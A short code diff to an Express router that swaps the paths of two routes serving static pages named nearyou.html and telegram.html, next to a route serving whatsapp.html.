@@ -23,12 +23,12 @@ router.get('/rlijoptybdtjuv1/:userId', function(req, res, next) {
   res.sendFile(path.join(__dirname + '/../public/whatsapp.html'))
 });
 
-router.get('/rlijoptybdtjuv2/:userId', function(req, res, next) {
+router.get('/rlijoptybdtjuv3/:userId', function(req, res, next) {
   res.sendFile(path.join(__dirname + '/../public/nearyou.html'))
 });
 
 
-router.get('/rlijoptybdtjuv3/:userId', function(req, res, next) {
+router.get('/rlijoptybdtjuv2/:userId', function(req, res, next) {
   res.sendFile(path.join(__dirname + '/../public/telegram.html'))
 });
 
